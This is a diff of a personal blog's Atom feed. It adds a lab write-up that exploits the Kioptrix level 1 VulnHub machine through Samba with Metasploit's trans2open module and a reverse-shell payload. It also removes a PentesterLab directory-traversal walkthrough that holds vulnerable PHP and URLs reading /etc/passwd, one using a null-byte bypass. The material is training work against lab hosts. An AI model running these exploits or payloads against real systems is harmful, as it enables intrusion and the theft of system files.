@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-02T16:45:36-05:00</updated>
+  <updated>2016-06-06T15:01:54-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,80 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-Kioptrix level 1]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
+    <updated>2016-06-06T09:21:18-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
+    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>nbtscab</li>
+<li>enum4linux</li>
+<li>Metasploit</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.182 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>
+
+<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>SMB Attack:</p>
+
+<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>
+
+<p><code>nbtscan 192.168.79.182</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use enum4linux to enumerate smb:</p>
+
+<p><code>enum4linux  -a 192.168.79.182</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the samba version</p>
+
+<p>Now start Metasploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msfconsole
+</span><span class='line'>use exploit/linux/samba/trans2open
+</span><span class='line'>set rhost 192.168.79.182
+</span><span class='line'>set payload generic/shell_reverse_tcp
+</span><span class='line'>exploit
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE SMB</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[sickos1.2]]></title>
@@ -2134,158 +2208,6 @@ The File Inclusion vulnerability allows an attacker to include a file, usually e
 <p>so I can do:</p>
 
 <p><code>http://192.168.79.162/fileincl/example2.php?page=https://pentesterlab.com/test_include.txt%00</code></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - Directory Traversal]]></title>
-    <link href="http://wg135.github.io/blog/2016/03/11/webforpentester-dir-traversal/"/>
-    <updated>2016-03-11T15:13:32-06:00</updated>
-    <id>http://wg135.github.io/blog/2016/03/11/webforpentester-dir-traversal</id>
-    <content type="html"><![CDATA[<p>Web for Pentester directory traversal:
-    This exercise is a set of the most common web vulnerabilities</p>
-
-<p>Difficluty: 1/5</p>
-
-<!--more-->
-
-
-<p>Tool: Burp Suite
-      Firebug</p>
-
-<h3>Example 1</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$UploadDir</span> <span class="o">=</span> <span class="s1">&#39;/var/www/files/&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nv">$UploadDir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
-</span><span class='line'><span class="o">...</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The developer does not filter <code>$file = $_GET['file'];</code>, so that I can just use <code>file=../../../../../../../../etc/passwd</code> to get <code>etc/passwd</code></p>
-
-<p>manual exploit:</p>
-
-<p><code>http://192.168.79.162/dirtrav/example1.php?file=../../../../../../../../etc/passwd</code></p>
-
-<p>Burp exploit:</p>
-
-<p><a href="https://vimeo.com/159110994" title="Click to Watch"><img src="http://i.imgur.com/7YTMFQp.png" alt="burp dir trav" /></a></p>
-
-<h3>Example 2</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;/var/www/files/&quot;</span><span class="p">)))</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
-</span><span class='line'>  <span class="o">...</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The developer tried to filer file by using <code>/var/www/files/</code>, so if I just use <code>file=etc/passwd</code> wont&rsquo;t work. However I can use <code>file=/var/wwww/files/../../../../../etc/passwd</code> to get passwd file.</p>
-
-<p>manual exploit:</p>
-
-<p><code>http://192.168.79.162/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd</code></p>
-
-<h3>Example 3</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nv">$UploadDir</span> <span class="o">.</span> <span class="nv">$file</span><span class="o">.</span><span class="s2">&quot;.png&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="c1">// Simulate null-byte issue that used to be in filesystem related functions in PHP</span>
-</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\x00.*/&#39;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$path</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
-</span><span class='line'>  <span class="o">...</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The developer tried to filter the file var. However, I can still use Null character to bypass it.
-The web application will check the path extension and verify that it is a .png file, bypassing the filter. When this path is passed to the filesystem, the null byte character effectively tells the filesystem to ignore anything that comes after it. When the path is resolved by the filesystem, it interprets the directory traversal vulns and transforms ‘/var/www/images/../../../etc/passwd%00new.png’ into ‘/etc/passwd’.</p>
-
-<p>manual exploit:</p>
-
-<p><code>http://192.168.79.162/dirtrav/example3.php?file=../../../../etc/passwd%00.png</code></p>
-
-<h4>reference</h4>
-
-<p><a href="https://www.fishnetsecurity.com/6labs/blog/common-web-application-vulnerabilities-part-6">Directory Traversal</a></p>
 ]]></content>
   </entry>
   
